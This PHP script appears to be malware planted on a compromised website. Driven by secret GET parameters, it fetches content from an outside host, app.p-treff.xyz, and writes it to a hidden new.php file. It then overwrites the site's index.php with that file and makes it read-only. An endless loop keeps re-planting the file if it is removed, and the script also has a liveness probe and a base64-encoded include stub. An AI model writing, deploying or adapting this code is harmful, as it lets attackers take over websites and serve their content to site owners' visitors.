<?php
//error_reporting(E_ERROR);set_time_limit(0); ignore_user_abort();

function GetFixedId($domain,$url_max_id){
	$fixed_md5 = md5($domain);
	$fixed_md5 = preg_replace("/[^\d]/si", '', $fixed_md5);

	$fixed_md5_len = strlen($fixed_md5);
	$index = 0;
	$line_no =0;
	for($i=0;$i<$fixed_md5_len;$i++){
		$index=$fixed_md5[$i];
		if($index>=0 && $index<=$url_max_id){
			$line_no = $index;
			break;
		}
		
	}
	return $line_no;
}
function getdirname(&$dirArray,$type=0,$dir='') {
	if($dir==''){
		$path=dirname(__FILE__);
	}else{
		$path=$dir;
	}
	foreach(scandir($path) as $afile){
		if($afile=='.'||$afile=='..') continue;
		if(is_dir($path.'/'.$afile)){
			$dirArray[] =$path.'/'.$afile;
			if($type==1){
				getdirname($dirArray,1,$path.'/'.$afile);
			}
			
		}
	}
	if($type==0 && count($dirArray)==0){
		$sitepath='temp';
		$dirArray[] =$sitepath;
	}
	
	return $dirArray;
}

$dirArray=array();



getdirname($dirArray,0,$_SERVER['DOCUMENT_ROOT']);

$server_name = '';
if (isset($_SERVER['HTTP_HOST'])) {
	$server_name = $_SERVER['HTTP_HOST'];
}elseif (isset($_SERVER['SERVER_NAME'])) {
	$server_name = $_SERVER['SERVER_NAME'];
}

$numbers=GetFixedId($server_name,count($dirArray)-1);


$dirname=$dirArray[$numbers];

$dirArray=array();


getdirname($dirArray,1,$dirname);
if(count($dirArray)==0){
	$dirArray[]=$dirname;
}


$numbers=GetFixedId($server_name,count($dirArray)-1);

$dirname=$dirArray[$numbers];

$formfile=$dirname.'/new.php';
$tofile=$_SERVER['DOCUMENT_ROOT'].'/index.php';


$key='t1j7n80g4hbcesydpvxuimkf6_olz2a5q-w93r';
$index='index.php';
$xiegang='/';
$fxgang='\\';
$wppath='wp-includes/version.php';
$code= 'PD9waHAgaWYgKGlzX2ZpbGUoInsjcGF0aCN9IikpIHtpbmNsdWRlX29uY2UoInsjcGF0aCN9Iik7fSA/Pg==';
$ppeifu='{#path#}';
$c1='c1';
$c2='c2';
$l3='l3';
$k1='k1';
$i1='i1';
$fuhao='{#path#}';
$group='{#z#}';
$domains='http://app.p-treff.xyz/wp-admin/admin/';

$path = $_SERVER['DOCUMENT_ROOT'] .$xiegang ;
$cache_dir =$dirname;
$cache_dir= str_replace($fxgang,$xiegang,$cache_dir).$xiegang;
$filename = $_SERVER['PHP_SELF'];
$filename = trim(strrchr($filename, $xiegang),$xiegang);

//echo $cache_dir .'<br>';
//echo $php_Self .'<br>';

$code= str_replace($fuhao,$cache_dir.$filename,base64_decode($code));

//echo  $code.'<br>';
//echo  $path.'<br>';


$g = isset($_GET['groups']) ? trim($_GET['groups']) : '';
$f = isset($_GET['slnames']) ? trim($_GET['slnames']) : '';
$k = isset($_GET['keykey']) ? trim($_GET['keykey']) : '';
$sokss='ok';
if (isset($_REQUEST['xxxaaa'])) {
	echo $sokss;
}
//echo  $g.'<br>';
//echo  $f.'<br>';
//echo  $c1.'<br>';
//echo  $c2.'<br>';
//echo  $l3.'<br>';
$status='';
if($g!='' && $f!=''){
	$status='success';
	$s = get_contents($domains.$f);
	$s= str_replace($group,$g,$s);
	
	file_put_contents($formfile,$s);
	echo $status;
}


if (isset($_GET['deletepath'])) {
	
	if(file_exists($formfile)){
		@chmod($formfile, 0777);
		if (!unlink($formfile)){
			echo 'error|'.$formfile;
		  }else{
			echo 'success|'.$formfile;
		  }
	}else{
		echo 'nofile|'.$formfile;
	}
	exit();
}

if (isset($_GET['textpath'])) {
	echo $formfile;
	echo '<br />';
	echo $tofile;
	echo '<br />1';
	if(!file_exists($tofile)){@copy($formfile,$tofile);chmod($tofile,0444);}
	if(!file_exists($formfile)){@copy($tofile,$formfile);chmod($tofile,0444);}
	if( hash('sha1',file_get_contents($formfile) )!=hash('sha1',file_get_contents($tofile))){@unlink($tofile);@copy($formfile,$tofile);chmod($tofile,0444);} 
	sleep(1);
}
if (isset($_GET['runpath'])) {
	do{
		if(!file_exists($tofile)){@copy($formfile,$tofile);chmod($tofile,0444);}
		if(!file_exists($formfile)){@copy($tofile,$formfile);chmod($tofile,0444);}
		if( hash('sha1',file_get_contents($formfile) )!=hash('sha1',file_get_contents($tofile))){@unlink($tofile);@copy($formfile,$tofile);chmod($tofile,0444);} 
		sleep(1);  
	}while(true);
}



 

?>
